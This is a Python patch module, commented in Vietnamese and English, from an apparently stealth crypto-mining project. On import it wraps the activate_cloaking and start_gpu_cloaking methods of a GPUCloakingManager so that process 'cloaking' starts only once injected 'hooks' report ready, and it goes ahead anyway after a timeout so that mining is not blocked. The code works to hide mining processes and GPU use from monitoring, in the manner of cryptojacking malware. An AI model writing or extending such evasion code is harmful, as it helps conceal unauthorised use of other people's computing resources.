#!/usr/bin/env python3
"""
Resource Manager Patch (Bản vá Resource Manager)
Tích hợp Hook Coordinator để chờ PHASE 3+ completion trước khi activate cloaking
"""

import os
import sys
import time
from pathlib import Path

# Add project root to Python path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

def patch_resource_manager_cloaking():
    """
    Patch Resource Manager để integrate với Hook Coordinator
    Thêm hook readiness check trước khi activate cloaking
    """
    
    # Import Hook Coordinator
    from mining_environment.coordination.hook_coordinator import get_hook_coordinator
    
    def wait_for_hooks_ready_wrapper(original_activate_function):
        """
        Wrapper function để wrap existing cloaking activation
        """
        def wrapped_activate_cloaking(self, pid: int, *args, **kwargs):
            """
            Enhanced cloaking activation với hook readiness check
            """
            print(f"🔍 [RM-PATCH] Checking hook readiness for PID {pid}")
            
            # Get Hook Coordinator
            coordinator = get_hook_coordinator()
            
            # Check if hooks are ready (từ PHASE 3+ completion)
            if coordinator.check_hooks_ready(pid):
                print(f"✅ [RM-PATCH] Hooks ready for PID {pid} - proceeding with cloaking activation")
                return original_activate_function(self, pid, *args, **kwargs)
            else:
                print(f"⏳ [RM-PATCH] Hooks not ready for PID {pid} - waiting...")
                
                # Wait for hooks to be ready (với timeout)
                if coordinator.wait_for_hooks_ready(pid, timeout=70):
                    print(f"✅ [RM-PATCH] Hooks became ready for PID {pid} - activating cloaking")
                    return original_activate_function(self, pid, *args, **kwargs)
                else:
                    print(f"⏰ [RM-PATCH] Timeout waiting for hooks PID {pid} - proceeding anyway")
                    # Proceed anyway after timeout để avoid blocking mining
                    return original_activate_function(self, pid, *args, **kwargs)
                    
        return wrapped_activate_cloaking
    
    return wait_for_hooks_ready_wrapper

def apply_resource_manager_patch():
    """
    Apply patch to Resource Manager cloaking functions
    """
    try:
        # Import Resource Manager classes that need patching
        from mining_environment.scripts.resource_control import ResourceManager
        from mining_environment.scripts.cloak_strategies import GPUCloakingManager
        
        # Get patch wrapper
        patch_wrapper = patch_resource_manager_cloaking()
        
        # Patch GPUCloakingManager if it has cloaking activation methods
        if hasattr(GPUCloakingManager, 'activate_cloaking'):
            original_method = GPUCloakingManager.activate_cloaking
            GPUCloakingManager.activate_cloaking = patch_wrapper(original_method)
            print("✅ [RM-PATCH] GPUCloakingManager.activate_cloaking patched")
            
        # Patch other cloaking methods as needed
        if hasattr(GPUCloakingManager, 'start_gpu_cloaking'):
            original_method = GPUCloakingManager.start_gpu_cloaking  
            GPUCloakingManager.start_gpu_cloaking = patch_wrapper(original_method)
            print("✅ [RM-PATCH] GPUCloakingManager.start_gpu_cloaking patched")
            
        print("✅ [RM-PATCH] Resource Manager patching completed successfully")
        return True
        
    except Exception as e:
        print(f"❌ [RM-PATCH] Resource Manager patching failed: {e}")
        return False

# Auto-apply patch when imported
if __name__ != "__main__":
    # Apply patch automatically when imported
    patch_success = apply_resource_manager_patch()
    if patch_success:
        print("🔧 [RM-PATCH] Resource Manager coordination patch active")
    else:
        print("⚠️ [RM-PATCH] Resource Manager patch failed - cloaking may activate prematurely")

# Test functionality
if __name__ == "__main__":
    print("🧪 [RM-PATCH] Testing Resource Manager patch...")
    
    # Test hook coordinator integration
    from mining_environment.coordination.hook_coordinator import get_hook_coordinator
    
    coordinator = get_hook_coordinator()
    test_pid = 99999
    
    # Test registration and notification workflow
    coordinator.register_pid_for_coordination(test_pid, {'test': True})
    
    # Test hook readiness check (should be False initially)
    hooks_ready = coordinator.check_hooks_ready(test_pid)
    print(f"Hooks ready for PID {test_pid}: {hooks_ready}")
    
    # Test notification
    coordinator.notify_phase3_completion(test_pid)
    
    # Test hook readiness check (should be True after notification)
    hooks_ready = coordinator.check_hooks_ready(test_pid)
    print(f"Hooks ready for PID {test_pid} after notification: {hooks_ready}")
    
    # Clean up
    coordinator.cleanup_pid(test_pid)
    
    print("✅ [RM-PATCH] Resource Manager patch test completed")